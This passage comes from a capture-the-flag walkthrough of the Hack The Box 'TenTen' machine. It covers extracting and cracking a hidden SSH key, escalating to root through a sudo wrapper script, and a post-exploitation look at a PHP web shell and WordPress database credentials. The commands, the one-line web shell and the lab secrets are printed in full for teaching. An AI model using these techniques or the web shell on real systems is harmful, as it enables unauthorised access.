X Resolution                    : 29
Y Resolution                    : 29
Image Width                     : 1500
Image Height                    : 1001
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1500x1001
Megapixels                      : 1.5
```

We attempt to run a few analysis tools against the file, including `binwalk` and `strings`, but unfortunately don't uncover anything particularly useful. However, we get a much more interesting result when we inspect the image using `steghide`.

The output reveals that data has been hidden within the image using steganography. More specifically, we discover an `id_rsa` private key that appears to have been embedded in the file. Even better, it doesn't appear to have a passphrase protecting it, meaning we may be able to extract the key and use it to investigate whether it provides us with a way into the machine.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Loot]
└─$ binwalk HackerAccessGranted.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Loot]
└─$ strings HackerAccessGranted.jpg | less

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Loot]
└─$ steghide info HackerAccessGranted.jpg
"HackerAccessGranted.jpg":
  format: jpeg
  capacity: 15.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "id_rsa":
    size: 1.7 KB
    encrypted: rijndael-128, cbc
    compressed: yes
```


We can now extract the `id_rsa` key hidden within the image. Once extracted, we can use `cat` to inspect its contents and confirm that it is a private SSH key. As we know that port 22 is open and SSH is available on the machine, this could potentially give us a way to authenticate and gain access.
``` Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ cat id_rsa    
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
```

We can attempt to use the key as it is, but first we'll need to use `chmod` to set the correct permissions. Setting the permissions to `400` makes the key readable only by its owner, which is required by SSH for private keys.

Once this is done, we can attempt to use the key in conjunction with the `takis` user we enumerated earlier. The username appears to be correct, but unfortunately our attempt reveals that the private key is protected with a passphrase. This means we'll need to find a way to recover the passphrase before we can use the key.
```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ chmod 400 id_rsa

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Loot]
└─$ ssh -i id_rsa takis@tenten.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 

```

Given how CTF-like the box has been so far, the next move seems fairly obvious: we'll need to try cracking the passphrase protecting the key. The fact that we've been handed an `id_rsa` key, only to find that it's protected by a passphrase, is a pretty strong indication that we're expected to try and recover it.

To do this, we'll first need to use `ssh2john` to convert the private key into a format that `John the Ripper` can understand. We can then use `john` alongside the `rockyou.txt` wordlist to attempt to crack the passphrase and see if we're able to recover it.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ ssh2john id_rsa > id_rsa.hash

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)     
1g 0:00:00:00 DONE (2026-09-19 14:51) 5.000g/s 3900Kp/s 3900Kc/s 3900KC/s superram..supermoy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The cracking attempt is successful, and the results show us that the password for the SSH key is `superpassword`. This gives us the answer to 'Guided Mode' task eight's question and means that, in the next section, we can use the recovered passphrase to log onto the machine and attempt to grab the user flag.

---
## Initial Access and User Flag

We now have a working private key and the passphrase needed to unlock it, so we can finally log into the machine as the `takis` user. We can use the SSH service we identified during our initial scan to establish our session and, once connected, begin looking for the user flag.

This time, with the correct passphrase available, we're able to authenticate successfully and log directly into the machine using SSH. Once the login completes, we can confirm that we're running as the `takis` user.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ ssh -i id_rsa takis@tenten.htb
The authenticity of host 'tenten.htb (10.129.64.49)' can't be established.
ED25519 key fingerprint is: SHA256:5a3db7g5K/KVQU7u9yholvmJI7kp3pWZj0qtGz4Yr9Q
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'tenten.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

takis@tenten:~$
```

We land directly in the user's home directory, where we can see the user flag sitting right in front of us. As it's already there, we might as well grab it now before moving on to the next section.
```Shell
takis@tenten:~$ ls
user.txt

takis@tenten:~$ cat user.txt
[user flag redacted]
```

---
## Privilege Escalation

After grabbing the user flag, we can now turn our attention to privilege escalation. As we're already on the machine, we can start with some basic local enumeration and look for anything that might allow us to escalate our privileges.

One of the first things we can check is whether `takis` has any sudo privileges using `sudo -l`. The output reveals something particularly interesting: we're allowed to run `/bin/fuckin` as root without being prompted for a password. This gives us the answer to 'Guided Mode' task ten's question and gives us a potentially useful lead to investigate further.
```Shell
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```

The file appears to be a non-standard executable, so we'll first need to fingerprint what we're dealing with. Running `file` confirms that `/bin/fuckin` is actually a Bash script. We can now take a closer look at its contents and break down what the script is doing:

- **`#!/bin/bash`** — this is the shebang line, telling the operating system to execute the file using `bash`.
- **`$1 $2 $3 $4`** — these are positional parameters representing the first four arguments passed to the script. For example, if we ran `./fuckin.sh whoami -la /etc`, then `$1` would be `whoami`, `$2` would be `-la`, `$3` would be `/etc`, and `$4` would be empty.
- **The lack of quotes around the variables** — Bash treats `$1` as the command to execute, while `$2`, `$3`, and `$4` are passed as arguments to it. In effect, the script simply executes whatever command we provide and forwards up to three additional arguments.

This is particularly interesting because we already know that `takis` can execute this script as root without a password. If the script allows us to specify the command that gets executed, we may have a straightforward way to turn this sudo permission into root command execution.
```Shell
takis@tenten:~$ file /bin/fuckin
/bin/fuckin: Bourne-Again shell script, ASCII text executable

takis@tenten:~$ cat /bin/fuckin 
#!/bin/bash 
$1 $2 $3 $4

takis@tenten:~$ fuckin whoami -la /etc

```

We can test the context in which the script runs by passing the `id` command to it. When run normally, the output confirms that we're operating as the `takis` user. We can also see that the account is a member of the `sudo` and `lxd` groups, shown by the `27(sudo)` and `110(lxd)` entries.

If we now re-run the same script using our available `sudo` permission and pass `id` again, we can see that the output has changed. This time, the command is being executed in the context of `root`, confirming that we've found a straightforward way to execute commands with elevated privileges.
```Shell
takis@tenten:~$ fuckin id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)

takis@tenten:~$ sudo fuckin id
uid=0(root) gid=0(root) groups=0(root)
```

To escalate our privileges, we can use the Bash script with our `sudo` permissions and pass it a Bash session to execute in the context of `root`. This gives us a root shell and complete control of the machine.

At this point, we've successfully compromised the box from our initial enumeration through to full root access, completing the machine.
```
takis@tenten:~$ sudo fuckin bash
root@tenten:~#
```

---
## Obtaining the Root Flag

Now that we have root privileges, we can grab the final flag. We first use `cd` to navigate to the root user's home directory, where we can find `root.txt`.

We can then use `cat` to read the contents of the flag, giving us the final piece needed to complete the machine. However, there are still a few things from our journey that we haven't fully answered, so rather than stopping here, we can use the **Beyond Root** section to investigate them further.
```Shell
root@tenten:/# cd /root

root@tenten:/root# ls
root.txt

root@tenten:/root# cat root.txt
[root flag redacted]
```


---
## Beyond Root

Although we've completed the machine, there are still a few things we can investigate further. In this section, we'll take a closer look at why we were unable to locate the web shell we uploaded earlier, as well as exploring the backend database behind the WordPress vulnerability we exploited.

### Locating the Web Shell

During our earlier enumeration, we successfully uploaded `shell.php.jpg` but were unable to locate it using our modified CVE-2015-6668 exploit. Instead, we discovered `HackerAccessGranted.jpg`, which gave us another lead to investigate and ultimately helped us progress through the machine.

Now that we have root privileges, we can inspect the web server directly to find out what happened to our original upload. There are a few steps involved in tracking it down, so let's break down the process:

1. **Navigate to the web root:** We start by using `cd` to move into the web root. As we're looking for a file uploaded through the website, this is a sensible place to begin our search.
2. **Search for the uploaded files:** We construct a `find` command, similar to the ones we've used to locate flags on previous machines. We restrict the search to the web root and start by looking for our original filename, `shell.php.jpg`. Unfortunately, this returns no results, leaving us with the same question we had earlier: where did our web shell go? To make sure our search is working correctly, we then look for `HackerAccessGranted.jpg`, the image we discovered using CVE-2015-6668. This time, we get the expected result, confirming that the search command is working as intended.
3. **Investigate the upload directory:** With the search working, we begin exploring the directory structure manually. We discover a folder for `2026`, containing a subdirectory named `09`. This matches the year-and-month structure we were investigating earlier when modifying the CVE-2015-6668 exploit to brute-force possible upload paths.
4. **Locate the renamed web shell:** After entering the directory and listing its contents with `ls`, we finally find our web shell under a different filename. This explains why searching for `shell.php.jpg` returned nothing: the file was uploaded, but its name was changed. This was likely intended to steer us away from an alternative routes, but it definitely explains why our earlier attempts came up empty.
5. **Inspect the file:** Finally, we use `cat` to inspect the file's contents and confirm that the PHP code has been preserved despite the filename change. Now that we know where the file is stored and what it has been renamed to, we can investigate whether it's accessible and usable as a web shell.

```Shell
root@tenten:/root# cd /var/www/

root@tenten:/var/www/html# find /var/www/html -type f -iname "shell.php.jpg"
root@tenten:/var/www/html# find /var/www/html -type f -iname "HackerAccessGranted.jpg"
/var/www/html/wp-content/uploads/2017/04/HackerAccessGranted.jpg
root@tenten:/var/www/html# cd wp-content/uploads/

root@tenten:/var/www/html# cd wp-content/uploads/
root@tenten:/var/www/html/wp-content/uploads# ls
2017  2026
root@tenten:/var/www/html/wp-content/uploads# cd 2026
root@tenten:/var/www/html/wp-content/uploads/2026# ls
09
root@tenten:/var/www/html/wp-content/uploads/2026# cd 09

root@tenten:/var/www/html/wp-content/uploads/2026/09# ls
shell.php_.jpg  test.docx  test.jpg  test.pdf  test.txt
root@tenten:/var/www/html/wp-content/uploads/2026/09# cat shell.php_.jpg 
<?php system($_REQUEST["cmd"]); ?>
```

When navigating to `http://tenten.htb/wp-content/uploads/2026/09/shell.php_.jpg`, we can see that the file doesn't work as a web shell. This looks like an intentional countermeasure, and as we mentioned earlier, it's likely designed to keep the progression of the box on its intended path. Given how CTF-like this machine has been throughout, it wouldn't be surprising if this was deliberately included to steer us away from this alternative route.
![BeyondRoot NoWebShell]({{ '/assets/img/htb-tenten/Tenten_BeyondRoot_NoWebShell.png' | relative_url }})

> **What actually happened:**
>After finding the renamed file, we can now explain what happened to our original `shell.php.jpg` upload. WordPress runs uploaded filenames through `sanitize_file_name()` before storing them, and part of this process checks for multiple extensions. When WordPress encounters a filename such as `shell.php.jpg`, it sanitises the intermediate extension by replacing the dot with an underscore, resulting in `shell.php_.jpg`.
>
>This is intended to prevent the classic `shell.php.jpg` bypass technique, where a misconfigured web server could potentially treat the `.php` portion of a filename as a PHP handler rather than only considering the final extension. In our case, this means the filename was changed by WordPress itself before being stored, rather than the upload simply failing.
>
>This is also worth distinguishing from the filtering we encountered earlier when testing the Job Manager upload function. The plugin's own checks determine which files we're allowed to upload, while WordPress's filename sanitisation provides another layer of protection after the upload is accepted. So, in effect, we've encountered two separate defensive mechanisms: the plugin-level file filtering and WordPress's own filename sanitisation.
 
#### IDOR Vulnerability

We can also have a little poke around and look at how the IDOR vulnrability is happening, we will first need to access the backend databse for the wordpress application. Afterwards we can check it's contents and see if we can discover anything that might indicate why the vulnrability exists.

We move back to web root and use `ls` with `grep` to find any PHP files that are avaiable, we soon find `wp-config.php` and we know that configuration files commonly hold passwords for access to things like attached databses and the like.
```Shell
root@tenten:/var/www/html/wp-content/uploads/2026/09# cd /var/www/html

root@tenten:/var/www/html# ls | grep php
index.php
wp-activate.php
wp-blog-header.php
wp-comments-post.php
wp-config.php <-- Configuration files can contain passwords
wp-config-sample.php
wp-cron.php
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php  
```

Checking the file, we can see evidence of password reuse. The password appears to be based on the `SuperPassword` value we discovered earlier, with `111` appended to it to create `SuperPassword111`. We can use these credentials to access the database as the `wordpress` user, giving us another useful avenue to investigate.
```PHP
<?php

define('WP_SITEURL', 'http://tenten.htb');
define('WP_HOME', 'http://tenten.htb');
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'SuperPassword111');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```


We first perform a quick sanity check to ensure the database is running, using `netstat` and `grep` to check whether MySQL is listening on its common port, `3306`. It is, and we can see that it is listening on the loopback interface.

We can now use the username and password we discovered in the last step to access the database and start looking around.
```Shell
root@tenten:/var/www/html# netstat -an | grep 3306
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN

t@tenten:/var/www/html# mysql -u wordpress -pSuperPassword111 wordpress
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>  
```

We start by looking at which tables are present in the database. After looking around for a short while, we don't find anything that is of direct relevance to us at this point. However, one table does stand out: `wp_posts`.

This is the table where the posts we were able to cycle through using the IDOR vulnerability are stored. This helps confirm what we were seeing earlier and gives us a better understanding of what is happening behind the scenes when we manipulate the post ID.
```SQL
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)
```

Selecting the columns shown below from the `wp_posts` table allows us to see exactly what is stored in each entry and how it relates back to the vulnerabilities we used earlier. The `ID` and `post_title` columns correspond to the values we were able to cycle through using the IDOR vulnerability, which is how we eventually discovered `HackerAccessGranted.jpg`.

The `guid` field is particularly interesting, as it contains the stored URL for each entry. This gives us another view of the file locations we were able to brute-force earlier using the CVE-2015-6668 exploit, helping to connect what we discovered externally with what is actually stored in the WordPress database.
![BeyondRoot WPPosts]({{ '/assets/img/htb-tenten/Tenten_BeyondRoot_WPPosts.png' | relative_url }})

We can select some of the entries from the table, but we can see that they aren't populated with any useful data. After looking through the remaining entries, we're unable to find anything else of particular interest, so this brings our investigation to an end and concludes the **Beyond Root** section.
```SQL
mysql> select post_content from wp_posts where id > 15;
+--------------+
| post_content |
+--------------+
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
+--------------+
11 rows in set (0.00 sec)

mysql> select post_content from wp_posts where id > 16;
+--------------+
| post_content |
+--------------+
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
+--------------+
10 rows in set (0.00 sec)

mysql> select post_content from wp_posts where id > 17;
+--------------+
| post_content |
+--------------+
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
|              |
+--------------+
9 rows in set (0.00 sec)

```

